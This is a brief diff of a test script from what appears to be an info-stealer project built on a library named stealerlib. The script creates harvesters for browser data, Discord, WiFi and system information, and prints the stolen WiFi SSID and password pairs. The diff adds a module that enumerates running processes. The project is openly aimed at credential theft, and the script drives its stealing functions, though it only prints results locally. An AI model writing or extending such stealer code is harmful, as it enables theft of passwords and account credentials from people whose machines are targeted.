@@ -2,15 +2,17 @@
 # -*- coding: utf-8 -*-
 """
     @author:  codeuk
-    @package: tests.py
+    @package: print_test.py
 """
 
 from stealerlib.wifi import WiFi
+from stealerlib.system import System
 from stealerlib.discord import Discord
 from stealerlib.browser import Browser
 
 
 if __name__ == '__main__':
+    system  = System()
     browser = Browser()
     network = WiFi()
     discord = Discord()
@@ -35,3 +37,6 @@ if __name__ == '__main__':
 
     network.get_wifi_passwords()
     print(network.credentials, '\n') # -> [(ssid, password), ...]
+
+    system.get_processes()
+    print(system.processes, '\n')  # -> [(pid, name, status, parent_process, child_processes), ...]
